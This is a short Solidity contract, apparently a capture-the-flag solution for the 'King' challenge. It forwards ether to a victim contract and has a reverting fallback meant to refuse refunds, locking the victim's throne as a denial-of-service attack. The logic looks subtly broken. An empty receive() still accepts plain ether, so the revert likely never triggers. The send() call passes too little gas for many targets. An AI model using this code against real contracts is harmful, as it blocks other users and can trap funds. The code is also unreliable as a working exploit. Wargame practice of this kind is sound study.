// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./og.sol";

contract KingAttack{
  address immutable victim;
  constructor(address  _victim)  {
    victim = _victim;   
  }

  function attact (address _victim) public payable{
   bool res =  payable(_victim).send(msg.value); 
   if(res == false){
   revert( "false");
   }
  }

  receive () external payable{

  }

  fallback() external payable{
    revert("Fool");
  }
}
